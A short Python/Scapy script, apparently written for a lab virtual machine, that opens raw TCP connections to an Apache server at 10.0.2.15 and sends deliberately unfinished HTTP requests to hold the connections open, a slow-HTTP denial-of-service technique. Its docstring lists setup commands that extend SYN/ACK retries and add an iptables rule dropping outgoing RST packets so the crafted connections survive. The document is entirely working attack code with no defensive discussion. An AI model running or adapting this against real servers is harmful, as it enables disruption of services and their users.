#!/usr/bin/env python3
from scapy.all import *

"""Commands for SYN/ACK during Scapy:

Lengthen TCP Timeout to 10 mins:
	echo 10 > /proc/sys/net/ipv4/tcp_synack_retries

Block RST packets (Otherwise Kernel will consider scapy packets as unauthorized and prevent them from transmitting):
	iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
Target:
	service apache2 start"""

conf.L3socket
conf.L3socket = L3RawSocket

i = IP(dst = "10.0.2.15")
req = "GET / HTTP/1.1\r\n" + \
"HOST: 10.0.2.15" #Missing final \r\n\r\n

for p in range(1000,1010):
	t = TCP(dport = 80, sport = p)

	r = sr1(i/t)

	t.flags = 'A'
	t.ack = r.seq + 1
	t.seq = r.ack

	send(i/t/req)
